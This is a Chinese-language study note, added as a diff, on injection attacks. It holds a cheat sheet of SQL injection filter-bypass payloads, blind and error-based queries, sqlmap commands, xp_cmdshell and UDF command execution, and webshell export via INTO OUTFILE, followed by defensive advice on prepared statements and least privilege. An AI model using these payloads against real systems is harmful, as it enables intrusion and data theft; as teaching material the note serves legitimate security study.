@@ -1,0 +1,525 @@
+注入攻击
+		
+	0x00注释符
+		//
+		--%20
+		/**/
+		#
+		--+
+		-- -
+		%00
+		;
+
+	0x01大小写绕过
+		用于屏蔽一些对大小写敏感的黑名单匹配
+			?id=1 UnIon SeLeCt user()#
+
+	0x02双写绕过
+		waf将关键字替换为空，没有回归
+			?id=1 uniunionon seselectlect user()#
+
+	0x03编码绕过
+		利用urlencode，ascii(char，hex，unicode等编程绕过)
+			' :
+			%u0027 %u02b9 %u02bc 
+			%u02c8 %u2032 
+			%uff07 %c0%27 
+			%c0%a7 %e0%80 %a7empty 
+			::
+			%u0020 %cuff00 
+			%c0%20 e0%80%a0
+			(: 
+			%u0028 %uff08 
+			%c0%28 %c0%a8 
+			%e0%80%a8 
+			): 
+			%u0029 %uff09 
+			%c0%29 %c0%a9 
+			%e0%80%a9
+
+	0x04绕过空格
+		用Tab代替空格
+		%20 %09 %0a %0b %0c %0d %a0 /**/
+
+	0x05like绕过
+		?id=1' or 1 like 1#
+		可以绕过对=、>等过滤
+
+	0x06in绕过
+		or '1' IN('1234')#
+		可以替代=
+
+	0x07等价函数或变量
+		hex()、bin() ==> ascii()
+		sleep() ==>benchmark()
+		concat_ws()==>group_concat()
+		mid()、substr() ==> substring()
+		@@user ==> user()
+		@@datadir ==> datadir()
+
+	0x08生僻函数
+		MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);
+		?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
+		SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql
+		?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+		and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))
+		and extractvalue(1, concat(0x5c, (select user()),0x5c))
+
+	0x09反引号绕过
+		select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
+
+	0x0a宽字符绕过
+		宽字节绕过主要是sql数据库编码问题造成的，在过滤单引号时，可以尝试用
+		%bf%27 %df%27 %aa%27
+
+	0x0b\n绕过
+		\n相当于NULL字符
+		select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
+		select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
+		select * from users where id=\nunion select 1,2,3,4,5,6,7,8,9,0
+
+	0x0c特殊字符绕过
+
+		001.greatest()绕过<>
+			select greatest(ascii(mid(user(),1,1)),150)=150;
+
+		002.mid()等绕过，
+			mid(user() from 1 for 1)
+			substr(user() from 1 for 1)
+			select ascii(substr(user() from 1 for 1)) < 150;
+
+		003.php中创建等waf绕过、
+			php过滤直接用preg_match('/('.waf.')/i',$id)
+
+			01.过滤and or
+				waf = 'and|or'
+				过滤代码 1 or 1=1   1 and 1=1
+				绕过方式 1 || 1=1   1 && 1=1
+
+			02.过滤union
+				waf = 'and|or|union'
+				过滤代码 union select user,password from users
+				绕过方式 1 && (select user from users where userid=1)='admin'
+
+			03.过滤where
+				waf = 'and|or|union|where'
+				过滤代码 1 && (select user from users where user_id = 1) = 'admin'
+				绕过方式 1 && (select user from users limit 1) = 'admin'
+
+			04.过滤limit
+				waf = 'and|or|union|where|limit'
+				过滤代码 1 && (select user from users limit 1) = 'admin'
+				绕过方式 1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin
+
+			05.过滤group by
+				waf = 'and|or|union|where|limit|group by'
+				过滤代码 1 && (select user from users group by user_id having user_id = 1) = 'admin'
+				绕过方式 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
+
+			06.过滤select
+				waf = 'and|or|union|where|limit|group by|select'
+				过滤代码 1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
+				绕过方式 1 && substr(user,1,1) = 'a'
+
+			07.过滤'
+				waf = 'and|or|union|where|limit|group by|select|\''
+				过滤代码 1 && substr(user,1,1) = 'a'
+				绕过方式 1 && user_id is not null    1 && substr(user,1,1) = 0x61    1 && substr(user,1,1) = unhex(61)
+
+			08.过滤hex
+				waf = 'and|or|union|where|limit|group by|select|\'|hex'
+				过滤代码 1 && substr(user,1,1) = unhex(61)
+				绕过方式 1 && substr(user,1,1) = lower(conv(11,10,16)) 
+
+			09.过滤substr
+				waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'
+				过滤代码 1 && substr(user,1,1) = lower(conv(11,10,16)) 
+				绕过方式 1 && lpad(user(),1,1) in 'r'
+
+	SQL注入简介
+		SQL注入攻击是通过将恶意的SQL查询或添加语句插入到应用的输入参数中，再在后台SQL服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一
+
+	Web程序三层架构
+		三层架构(3-tier architecture)通常意义上就是将整个业务应用划分为一下三个层面
+			* 界面层(User Interface layer)
+			* 业务逻辑层(Business Logic Layer)
+			* 数据访问层(Data access layer)
+		区分层次的目的即为了高内聚低耦合的思想
+		在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发
+		由数据库驱动的Web应用程序依从三层架构的思想也分为了以下三层
+			* 表示层
+			* 业务逻辑层(又称领域层)
+			* 数据访问层(又称存储层)
+		用户访问实验楼主页进行了如下过程
+			* 在Web浏览器中输入www.shiyanlou.com连接到实验楼服务器
+			* 业务逻辑层的Web服务器从本地存储中加载index.php脚本并解析
+			* 脚本连接位于数据访问层的DBMS(数据库管理系统)，并执行SQL语句
+			* 数据访问层的数据库管理系统返回SQL语句执行结果给Web服务器
+			* 业务逻辑层的Web服务器将Web页面封装成HTML格式发送给表示层的Web浏览器
+			* 表示层的Web浏览器解析HTML文件，将内容展示给用户
+		在三层架构中，所有通信都必须要经过中间层，简单地说，三层架构是一种线性关系
+
+	SQL注入漏洞详解
+		SQL注入产生原因及威胁
+			Web服务器会向数据访问层发起SQL查询请求，如果权限验证通过就会执行SQL语句
+			这种网站内部直接发送的Sql请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险
+			SQL注入带来的威胁主要有以下几点
+				* 猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息
+				* 绕过认证，列如绕过验证登录网站后台
+				* 注入可以借助数据库的存储过程进行提权等操作
+
+	判断SQL注入点
+		通常情况下，可能存在SQL注入漏洞的URL是类似这种形式
+			http://xxx.xxx.xxx/abcd.php?id=XX
+		对SQL注入的判断，主要有两个方面
+			* 判断该带参数的URL是否存在SQL注入
+			* 如果存在SQL注入，那么属于哪种SQL注入
+		可能存在SQL注入攻击的ASP/PHP/JSP动态网页中，一个动态网页中可能只有一个参数，有时可能有多个参数
+		有时是整型参数，有时是字符串型参数，不能一概而论
+		总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入
+		如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大
+		判断是否存在SQL注入漏洞
+			------------------------
+			http://xxx/abc.php?id=1'
+			------------------------
+			如果页面返回错误，则存在SQL注入
+			原因是无论字符型还是整型都会因为单引号个数不匹配而报错
+			如果未报错，不代表不存在SQL注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入
+		判断SQL注入漏洞的类型
+			通常SQL注入漏洞分为2种类型
+				* 数字型
+				* 字符型
+			其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分常用的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型
+
+		OS注入
+			调用OS命令引起的安全隐患
+				Web开发所使用的编程语言中，大多数都能通过Shell执行OS(操作系统)命令
+				通过Shell执行OS命令时，或者开发中用到的某个方法其内部利用了Shell时，就有可能出现OS命令被任意执行的情况
+				这种现象被称为OS命令注入
+			安全隐患产生的原因
+				内部调用OS命令的函数以及系统调用(System Call)中，多数都通过Shell来启动命令
+				Shell是用来操作OS的命令行界面，如Windows中的cmd.exe、Unix系的OS中的sh、bash、csh等
+				通过Shell来启动命令，能够使用管道命令(Pipe)或重定向等功能的使用变的更加便捷
+				system(“echo hell > a.txt”); PHP中调用system函数
+				实际启动的命令，通过sh调用命令
+				然而，Shell提供的便利功能却会称为OS命令注入漏洞产生的根源
+				Shell提供了一次启动多个命令的语法，因此外界就可以在参数中做手脚，使得在原来的命令的基础上又有其他的命令被启动
+			在Shell中执行多条命令
+				shell提供了通过制定1行来启动多个程序的方法
+				而OS命令注入攻击就恶意利用了Shell能够启动多个程序的特性
+				-----------------------------------------------------------
+				$ echo aaa ； echo bbb#利用分号；连续执行多条命令
+				aaa
+				bbb
+				$ echo aaa & echo bbb#在后台和前台执行多条命令
+				aaa
+				bbb
+				[1] + Done echo aaa
+				$echo aaa && echo bbb#利用&&,如果第1个命令执行成功就执行第2个命令
+				aaa
+				bbb
+				$ cat aaa || echo bbb#利用||，如果第1个命令执行失败就执行第2个命令
+				cat: aaa:NO such file or directory
+				bbb
+				$wc `ls`#将倒引号中的字符作为命令执行
+				$ echo aaa | wc #利用管道符，将第一个命令的输出作为第二个命令的输入
+				-----------------------------------------------------------
+			Shell中的元字符
+				Windows的cmd.exe中能够使用&来连续执行多条命令
+				另外|(管道功能)、&&或||的用法也和Unix、Linux一样
+				Shell中拥有特殊意义的字符(如；、|等)被称为shell的元字符
+				把元字符当做普通字符使用时需要对其进行转义
+				而如果在指定OS命令参数的字符串中混入了SHell的元字符，就会使得攻击者添加的OS命令被执行，这也就是OS命令注入漏洞产生的原因
+			安全隐患的产生的原因总结
+				Web应用的开发语言中，有些函数的内部实现利用了Shell
+				如果开发者使用了这些内部调用Shell的函数，就可能会使得意料之外的OS命令被执行
+				这种状态被称为OS命令注入漏洞
+				OS命令注入漏洞的形成需要同时满足以下三个条件
+					* 使用了内部调用Shell的函数(system、open等)
+					* 将倍加传入的参数传递给内部调用的shell的函数
+					* 参数中shell的元字符没有被转义
+			解决对策
+				为了防范OS命令注入漏洞，有以下三种推荐方式
+					* 选择不调用OS命令的实现方法
+						不调用利用shell的功能，既能杜绝了OS命令注入漏洞混入的可能性，又消除了调用OS命令的而系统开销，能够从多方面提高应用的性能
+					* 不将外界输入的字符串传递给命令行参数
+					* 使用安全的函数对传递给OS命令参数进行转义
+
+	SQL注入
+		注入攻击是Web安全领域中一种最为常见的攻击方式，XSS的本质相当于针对HTML的注入攻击，以及 *安全世界观* 中的数据与代码分离原则就是为了解决注入攻击而产生的
+		注入攻击的条件
+			* 用户能够控制输入
+			* 原本程序要执行的代码中拼接了用户输入的数据
+		SQL注入第一次出现在黑客rfp发布的一篇题为NT Web Technology Vulnerabilities的文章
+			http://www.phrack.org/issues.html?issue=54&id=8#article
+		SQL注入的条件
+			用户能够控制输入(变量ShipCity)
+			原本程序要执行的代码中拼接了用户输入的数据
+				{这个拼接非常重要，这个拼接导致了代码的注入}
+		在SQL注入的过程，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利
+			e.g.
+				攻击者在参数中输入 ' 引起执行查询语句的语法错误，服务器直接返回了错误信息
+				一句错误信息，可以知道服务器用什么作为数据库，查询语句的伪代码极有可能是其对应的语句
+				错误回显披露了敏感信息，对于攻击者来说，构造SQL注入的语句就可以更加得心应手了
+
+		盲注(Blibd Injection)
+			[
+				布尔盲注
+					简介及场景
+						盲注的本质就是，在页面无法给我提供回显的时候的一中继续注入的手段
+						在我们输入and 1或者and 0，浏览器返回给我们两个不同的页面，而我们就可以根据返回的页面来判断正确的数据信息
+					相关函数
+						length()函数
+							length()函数的作用是返回字符串str的长度，以字节为单位，一个多字节字符算作多字节
+							这意味着，对于包含四个两字节字符的字符串，length()返回8，而char_length()返回4
+						substr()函数
+							substr()函数从特定位置开始的字符串返回一个给定长度的子字符串
+							substr()函数有三个参数，用法为：substr(str,pos,len)
+							str参数代表待截取的字符串
+							pos参数代表从什么位置开始截取
+							len参数表示字符串截取的长度
+							其他与substr()函数作用相似的函数有mid()和substring()函数，其用法和substr()函数一致
+						ascii()函数
+							ascii()函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符
+					注入实现
+						布尔盲注用到的函数length()、substr()和ascii()函数
+						这里直接用数据库阐述原理，在实际中，如下面的例子注入点为id=1，我们已经无法使用union来直接查询，此处我们需要用到关键字and，我们知道只有and前后的条件都为真的时候，数据库才会输出结果
+						* 判断数据库名的长度
+						* 猜解数据库名
+						* 猜解表名
+						* 猜解字段
+						* 猜解数据
+					自动化工具
+						sqlmap注入工具
+							可以直接使用自动化工具进行注入，可以直接简单点，语句大概是 sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx
+							random随机给一个请求头，delay多少秒尝试一次，也可以使用--safe-freq(后面跟一个数字，代表每隔几次访问一次正常链接)和thread(线程)，technique可选择注入类型，dbms选择数据库，如果有防火墙可以跟上--tamper
+							sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx --random-agent --delay 3 --thread=3 --technique=B --dbms=mysql
+						Burp中的爆破模块
+							直接抓取输入，and ascii(substr(database(),1,1))=1的数据包，放到爆破模块
+			]
+			但在很多时候，Web服务器关闭了错误回显，这时还有一种办法可能成功完成SQL注入
+			攻击者为了应对这种情况，研究出了Blibd Injection(盲注)这一技巧
+			盲注就是在服务器没有错误回显是完成注入攻击，服务器没有错误回显，对于攻击者来说缺少了非常重要但调试信息，所以攻击者必须找到一个方法来验证注入但SQL语句是否得到执行
+			最常见的盲注验证方法是构造简单条件语句，根据页面是否发生变化判断SQL语句是否得到执行，对于Web应用来说，也不会返回给用户，攻击者看到的页面结果将为空或者跳出错页面
+			当攻击者构造条件 and 1 = 1 时，如果页面返回正常，则说明SQL语句的 and 成功执行了那么判断id参数就是SQL注入的漏洞
+			盲注原理
+				攻击者通过简单的条件判断，再对比页面返回结果的差异，就可以判断SQL漏洞是否存在
+
+		Timing Attack
+			黑客TinKode在著名的安全邮件列表Full Disclosure上公布了一些他入侵mysql.com搜获得的细节
+			[mysql是当前最流行的数据库软件之一]
+			[
+				TinKode的成就
+				在皇家海军的网站暂时不可用后泰恩科德声称已经破解它
+				他还破坏了NASA服务器的安全性，在戈达德太空飞行中心的NASA地球观测系统内发布了来自FTP服务器的屏幕截图
+				他声称可以使用属于欧洲航天局的计算机
+			]
+			{
+				利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长
+				通过时间长短的变化
+				这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack
+			}
+
+	数据库攻击技巧
+
+		常见的攻击技巧
+			SQL注入是基于数据库的一种攻击，不同的数据库有着不同的功能、不同的算法和函数，因此，针对不同数据库，SQL注入的技巧也有所不同
+			SQL注入漏洞，仅仅、、可以猜解出数据库的对应版本
+			如下面这段Payload，如果MySQL版本是4，就会返回TRUE
+			----------------------------------------------------------------
+			Http://www.site.com/news.php?id=5 and substring(@@version,1,1)=4
+			----------------------------------------------------------------
+			如下Payload，则是利用union select来分别确认表名admin是否存在，列名passwd是否存在
+			-------------------------------------------
+			id=5 union all select 1,2,3 from admin
+			id=5 union all select 1,2,passwd from admin
+			-------------------------------------------
+			这个过程非常繁琐，所以非常有必要使用一个自动化工具来帮助完成整个过程
+				http://sqlmap.sourceforge.net
+			在注入攻击的过程中，常常会用到一些读写文件的技巧
+			如MySQL中，就可以通过LOAD_FILE()读取系统文件，并通过INTO DUMPFILE写入本地文件，当然这要求当前数据库用户有读写系统相应文件或目录的权限
+			除了用INTO DUMPFILE外，还能用INTO OUTFILE
+				区别
+					DUMPFILE适用于汇编语言，它会将目标文件写入同一行内
+					OUTFILE适用于纯文本文件，更适合阅读(相对于DUMPFILE)
+			写入文件的技巧，经常被用于导出一个Webshel，为攻击者的进一步攻击做铺垫
+			因此在设计数据库安全方案时，可以禁用普通数据库用户具备操作文件的权限
+
+		命令执行
+			{在MySQL中，除了可以通过带出Webshell间接执行命令外，还可以利用用户自定义函数的技巧，即UDF(User-Defined Funcions)来执行命令}
+			在流行的数据库中，一般都支持从本地文件系统中导入一个共享文件作为自定义函数，使用如下语法可以创建UDF
+			----------------------------------------------------
+			CREATE FUNCTION f_name INTEGER SONAME shared_library
+			----------------------------------------------------
+			在MySQL4的服务器上，Marco Ivaldi公布了一段代码，可以通过UDF执行系统命令，尤其是当运行mysql进程的用户为root时，将直接获得root
+			但这段代码在MySQL5+将会受到限制，因为其创建自定义函数但过程并不符合新的版本规范，且返回值永远为0
+			后来，安全研究者找到了另外的方法，通过lib_mysqludf_sys提供的几个函数执行系统命令，其中最主要的函数是sys_eval()和sys_exec()
+			在攻击过程中，将lib_mysqludf_sys.so上传到数据库能访问到的路径下，在创建UDF之后，就可以只用sys_eval()等函数了
+				* sys_eval，执行任意命令，并输出返回
+				* sys_exec，执行任意命令，并退出码返回
+				* sys_get，获得一个环境变量
+				* sys_set，创建或修改一个环境变量
+			lib_mysqludf_sys的相关信息可以在官方网站获得
+				http://www.mysqludf.org/lib_mysqludf_sys/index.php
+			UDF不仅仅是MySQL的特性，其他数据库也有着类似的功能，利用UDF的功能实施攻击的技巧也大同小异，查阅数据库的相关文档将会有所帮助
+			在MS SQL Server中，则可以使用储存过程xp_cmdshell执行系统命令 *攻击储存过程*
+			在Oracle数据库中，如果服务器同时还有Java环境，那么也有可能造成命令执行，当SQL注入后可以执行多语句的情况下，可以在Oracle中创建Java的存储过程执行系统命令
+			一般来说，在数据库执行系统命令，要求具有较高的权限，在数据库加固时，可以参阅官方文档给出的安全指导文档
+			在建立数据库账户时应该遵循最小权限原则，尽量避免给Web应用使用数据库的管理员权限
+
+		攻击储存过程
+			存储过程为数据库提供了强大的功能，它与UDF很像，但存储过程必须使用CALL或者EXECUTE来执行，在MS SQL Server和Oracle数据库中，都有大量内置存储过程，在注入攻击但过程中，存储过程将为攻击者提供极大的便利
+			在MS SQL Server中，存储过程xp_cmdshell可以说是臭名昭著了，无数的黑客教程在讲到注入SQL Server时都是使用它执行系统命令
+			--------------------------------------------
+			EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
+			EXEC master.dbo.xp_cmdshell 'ping'
+			--------------------------------------------
+			xp_cmdshell在SQL Server 2000中默认是开启的，但在SQL Server 2005+中默认是禁止的，但是如果当前数据库用户拥有sysadmin权限，则可以使用sp_configure重新开启它，如果在SQL Server 2000中禁用了xp_cmdshell，则可以使用sp_addextendedproc开启它
+			除了xp_cmdshell外，还有一些其他的存储过程对攻击过程也是有帮助的
+			e.g.(可操作注册表的存储过程)
+				* xp_regaddmultistring
+				* xp_regdeletekey
+				* xp_regdeletevalue
+				* xp_regenumkeys
+				* xp_regenumvalues
+				* xp_regread
+				* xp_regremovemultisting
+				* xp_regwrite
+			此外，以下存储过程对攻击者也非常有用
+				* xp_servicecontrol，允许用户启动、停止服务
+				--------------------------------------------------
+				(exec master..xp_servicecontrol 'start','schedule'
+				exec master..xp_servicecontrol 'start','server')
+				--------------------------------------------------
+				* xp_availablemedia，显示机器上有用的驱动器
+				* xp_dirtree，允许获得一个目录树
+				* xp_enumdsn，列举服务器上的ODBC数据源
+				* xp_loginconfig，获取服务器安全信息
+				* xp_makecab，允许用户在服务器上创建一个压缩文件
+				* xp_ntsec_enumdomains，列举服务器可以进入的域
+				* xp_terminate_process，提供进程ID，终止此进程
+			{除了利用存储过程外，存储过程本身也可能会存在注入漏洞}
+
+		编码问题
+			在有些时候，不同的字符编码也有可能会导致一些安全问题，在注入的历史上，曾经出现过基于字符集的注入技巧
+			注入攻击中常常会用到 '、" 等特殊字符在应用中，开发者为了安全，经常会使用转义字符 \ 来转义这些特殊字符，但当数据库使用了宽字符集时，可能产生一些意想不到但漏洞
+			解决方法
+				统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异(统一设置为UTF-8)
+			基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题
+			如果因为种种原因无法统一字符编码，则需要单独实现一个用于过滤或转义的安全函数，在其中需要考虑到字符的可能范围
+			根据系统使用的不同字符集来限制用户输入数据的字符允许范围，以实现安全过滤
+
+		SQL Column Truncation
+			黑客Stefan Esser提出了一种名为SQL Column Truncation的攻击方式
+				http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities
+			在MySQL的配置选项中，有一个sql_mode选项，当MySQL的sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error，这可能会导致发生一些问题
+			测试过程如下(MySQL5)
+				首先开启strict模式
+					在strict模式下，因为输入的字符超出了长度限制，因此数据库返回一个error信息，同时数据插入不成功
+				然后关闭strict模式
+					数据库只返回一个warning信息，但数据插入成功
+				此时如果插入两个相同的数据会有什么结果
+					根据不同业务可能会造成不同的逻辑问题
+					如下面这段代码
+					----------------------------------------------
+					$userdata = null;
+					if (isPasswordCorrect($username,$password))
+					{
+						$userdata = getUserDataByLogin($username);
+						... ...
+					}
+					----------------------------------------------
+					它使用下面这条SQL语句来验证用户名和密码
+					--------------------------------------------------------------
+					SELECT username FROM users WHERE username = ? AND passhash = ?
+					--------------------------------------------------------------
+					但如果攻击者插入一个同名但数据，则可以通过此认证，在之后但授权过程中，如果系统仅仅通过用户名来进行授权，则可能造成一些越权访问
+					--------------------------------------
+					SELECT * FROM users WHERE username = ?
+					--------------------------------------
+			在这个问题公布不久，WordPass就出现了一个真实案例
+			注册一个用户名为admin(55个空格)x的用户，就可以修改愿管理员的密码了
+			但这个漏洞并未造成严重的后果，因为攻击者在此只能修改管理员的密码，而新密码仍然会发送到管理员的邮箱
+			尽管如此，我们并不能忽视SQL Column Truncation的危害，因为也许下一次漏洞被利用时，就没有那么好的运气了
+
+	正确地防御SQL注入
+		从防御的角度看，要做的事情有两个
+			* 找到所有的SQL注入漏洞
+			* 修复这些漏洞
+		SQL注入的防御并不是一件简单的事，开发者常常会走入一些误区，如只对用户输入做一些escape处理，而这是不够的
+		mysql_real_escape_string()仅仅会转义
+			'
+			"
+			\r
+			\n
+			NULL
+			Control-Z
+		这几个字符，在本例中SQL注入所使用的Payload完全没有用到这几个字符
+		那是不是在增加一些过滤字符，就可以了呢？
+		如处理包括()、空格在内的一些特殊字符，以及一些SQL保留字，如SELECT、INSERT等
+		其实，这种基于黑名单的方法，都或多或少地存在一些问题，如下面的例子
+		------------------------------------
+		SELECT /* */passwd/* */from/* */user
+		SELECT(passwd)from(user)
+		------------------------------------
+		不需要括号、引号的例子，其中0x61646D696E是字符串admin的十六进制编码
+		------------------------------------------------
+		SELECT passwd from users where user=0x61646D696E
+		------------------------------------------------
+		而SQL保留字中，像HAVING、ORDER BY等都有可能出现在自然语言中，用户提交的正常数据可能也会有这些单词，从而造成误杀，因此不能轻易过滤
+
+		使用预编译语句
+			{防御SQL注入的最佳方式，就是使用预编译语句绑定变量}
+			使用预编译语句的SQL语句语义不会发生改变，在SQL语句中，变量用？表示，攻击者无法改变SQL的结构
+
+		使用储存过程
+			{除了使用预编译语句外，我们还可以使用安全的储存过程对抗SQL注入，使用储存过程的效果和使用预编译语句类似，其区别就是存储过程需要先将SQL语句定义在数据库中，但需要注意的是，存储过程中也有可能会存在注入问题，因此因该尽量避免在存储过程内使用动态的SQL语句}
+			如果无法避免，则因该使用严格的输入过滤或者是编码函数来处理用户的输入数据
+			但是有的时候，可能无法使用预编译语句或存储过程，这时候只能在此回到输入过滤和编码等方法上来
+
+		检查数据类型
+			检查输入数据但数据类型，在很大程度上可以对抗SQL注入
+			其他的数据格式或类型检查也是有用的
+			但数据类型检查并非万能，如果需求就是需要用户提交字符串，则需要依赖其他的方法防范SQL注入
+
+		使用安全函数
+			一般来说，各种Web语言都实现了一些编码函数，可以帮助对抗SQL注入，但前文介绍了一些编码函数被绕过但例子，因此我们需要一个足够安全但编码函数
+			从数据库自身的角度来看，因该使用最小权限原则，避免Web应用直接使用root、dbowner等高级权限账户直接链接数据库
+			如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户，Web应用使用的数据库账户不应该有创建自定义函数、操作本地文件的权限
+
+	其他注入攻击
+		除了SQL注入外，在Web安全领域还有其他的注入攻击，这些注入攻击都有相同的特点，就是应用违背了数据与代码分离原则
+
+		XML注入
+			XML是一种常用的标记语言，通过标签对数据进行结构化表示
+			XML与HTML都是SGML(Standard Generalized Markup Language(标准通用标记语言))
+			XML与HTML一样，也存在注入攻击，甚至在注入方法上也非常类似
+			XML注入也需要满足注入攻击的条件，与HTML注入的修补方法类似，对用户输入数据中包含的语言本身的保留字符进行转义即可
+
+		代码注入
+			代码注入比较特别的一点是其与命令注入往往都是有一些不安全的函数或者方法引起的，其中的典型代表就是eval()
+			在Java中也可以实施代码注入
+			JSP的动态include也可能导致代码注入
+			严格来说，PHP、JSP的动态include(文件包含漏洞)导致的代码执行，都可以算是一种代码注入
+			代码注入多见于脚本语言，有时候代码注入也易造成命令注入(Command Injection)system()函数在执行时，缺乏必要的安全检查，攻击者可以由此注入额外的命令
+			对抗代码注入、命令注入时，需要禁用eval()、system()等可以执行命令的函数，如果一定要使用这些函数，则需要对用户的输入数据进行处理，此外在PHP、JSP中避免动态include远程文件，或者安全地处理它
+			代码注入往往是由于不安全的编程习惯所造成的，危险函数因该尽量避免在开发中使用，可以在开发规范中明确指出那些函数是禁止使用的，这些危险函数一般在开发语言的官方文档中可以查遭到一些建议
+
+		CRLF注入
+			CRLF实际上是两个字符
+				CR是Carriage Return(ASCII 13，\r)
+				LF是Line Feed(ASCII 10，\n)
+				\r、\n都表示换行，其十六进制编码是0x0d、0x0a
+			CRLF常被用作不同语义之间的分隔符，因此通过注入CRLF字符，就有可能改变原有的语义
+			CRLF注入并非仅能用于log注入，凡事使用CRLF作为分隔符的地方都可能存在注入，如注入HTTP头
+			在HTTP协议中，HTTP头是通过\r、\n来分隔的，因此如果服务器端没有过滤\r、\n而又把用户输入的数据放在HTTP头中，则有可能导致安全隐患，这种在HTTP头中的CRLF注入，又可以称为Http Response Splitting
+			Cookie是最容易被用户控制的地方，应用经常会将一些用户信息写入Cookie中，从而被用户控制
+			但是HTTP Response Splitting并非只能通过两次CRLF注入到HTTP Body，有时候注入一个HTTP头，也会带来安全问题
+			可以说HTTP Response Splitting的危害比XSS还要大，因为他破坏了HTTP协议的完整性
+			对抗CRLF的方法很简单，只需要管理好\r、\n这两个保留字符即可，尤其是那些使用换行符作为分隔符的应用
+
+	总结
+		注入攻击是应用违背了数据与代码费力原则导致的结果，它有两个条件
+		在对抗注入攻击时，只要牢记数据与代码分离原则，在拼凑发生的地方进行安全检查，就能避免此类问题
+		SQL注入是Web安全中的一个重要领域
+		理论上，通过设计和实施合理的安全解决方案，注入攻击是可以彻底杜绝的
